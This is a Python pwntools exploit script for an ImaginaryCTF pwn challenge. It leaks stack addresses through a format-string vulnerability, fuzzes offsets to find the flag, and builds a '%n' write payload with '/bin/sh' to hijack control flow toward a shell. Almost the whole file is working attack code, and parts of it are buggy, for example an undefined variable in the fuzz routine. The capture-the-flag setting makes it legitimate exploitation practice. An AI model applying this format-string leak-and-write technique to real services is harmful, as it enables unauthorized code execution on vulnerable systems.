from pwn import *
import time
import sys
################# BOOKKEEPING/HELPER FUNCTIONS & DEFINITIONS ##################

def _(arg, end='\n'):
    print(f'{logger("%r")}: {arg}')
    pass
stdout = sys.stdout.buffer.write
logger = time.strftime
local = True
debug = _
host,port = 'puzzler7.imaginaryctf.org', 20000
filename = 'vuln'
elf = ELF(f'./{filename}')
padding = b'\x20'
def leak_addresses():
    global host,port,debug
    success = False
    # for some reason this fails? so we loop until it succeeds 
    while not success:
        try:
            p = remote(host,port) if (not local) else elf.process()
            payload = b'%p|'*128
            debug(f'got: {p.recv()}\n')
            p.sendline(payload)
            debug(f'sent: {payload}\n')
            resp = p.recv().rstrip().split(b'|')[:]
            addresses = [e[:] for e in resp]#if e != b'(nil)' and len(e) > 12]
            success = True if len(addresses) else False
            debug(f'leaked addresses: {addresses}\n')
        except Exception as e:
            print(f"Exception: {e}")
            p.close()
            success = False
        finally:
            p.close()
    return addresses

addresses = leak_addresses()
stack_addresses = [e for e in addresses if e.startswith(b'7f')]
other_addresses = [e for e in addresses if e not in stack_addresses]
fmt_dict = {'ptr':b'%p.','hex':b'%x.','str':b'%s.','int':b'%d.'}
###############################################################################
############################## EXPLOIT VARIABLES ##############################
def fuzz(addr,n_dummys=10,n_leaks=1,dummy_param=fmt_dict['ptr'],leak_param=fmt_dict['ptr']):
    global host, port, fmt_dict, debug
    if type(addr) != type(1):
        addr = int(addr, 16)
    try:
        p = remote(host,port) if (not local) else elf.process()
        addr_bytes = p64(addr)
        addr_bytes = addr_bytes[:addr_bytes.index(b'\x00')]
        inner = (b'__')+ ((dummy_param)*n_dummys)
        outer = (b'__')+((leak_param)*n_leaks)
        fmt_string = addr_bytes+inner+outer
        debug(f'parameter: {i}\taddress: {addresses[i]}')
        debug(f'got: {p.recv()}')
        p.sendline(fmt_string)
        debug(f'sent: {fmt_string}')
        buf = p.recv()
        debug(f'got: {buf}\n')
        if b'ictf' in buf:
            print(f'::: {buf}\n')
            input()
    except Exception as e:
        print(f"Exception: {e}")
        p.close()
    finally:
        p.close()
"""
N_DUMMY_MIN = 0
N_DUMMY_MAX = 10
N_LEAKS_MIN = 0
N_LEAKS_MAX = 10
for i in range(len(addresses)):
    for j in range(N_DUMMY_MIN,N_DUMMY_MAX):
        for k in range(N_LEAKS_MIN,N_LEAKS_MAX):
            fuzz(addresses[i], n_dummys=j, n_leaks=k)
            #input()
"""
try:
    p = remote(host,port) if (not local) else elf.process()#gdb.debug(f'./{filename}',"c")#elf.process()
    rbp_addr = int(addresses[9][2:],16)
    rbp_addr_b = p64(rbp_addr)
    rbp_addr_b = rbp_addr_b[:rbp_addr_b.index(b'\x00')]
    free_addr = int(addresses[27][2:],16)
    free_addr_b = p64(free_addr)
    free_addr_b = free_addr_b[:free_addr_b.index(b'\x00')]
    fmt_string = b'/bin/sh'+padding*16+(rbp_addr_b+(8-len(rbp_addr_b))*padding)+(free_addr_b+(8-len(free_addr_b))*padding)
    fmt_string += b'%1x%17$n%1x%28$n'
    fp = open('out','wb')
    fp.write(fmt_string)
    #stdout(fmt_string)
    debug(f'got: {p.recv()}')
    p.sendline(fmt_string)
    debug(f'sent: {fmt_string}')
    debug(f'got: {p.recv()}')
except Exception as e:
    print(f"Exception: {e}")
    p.close()
finally:
    p.close()
    fp.close()
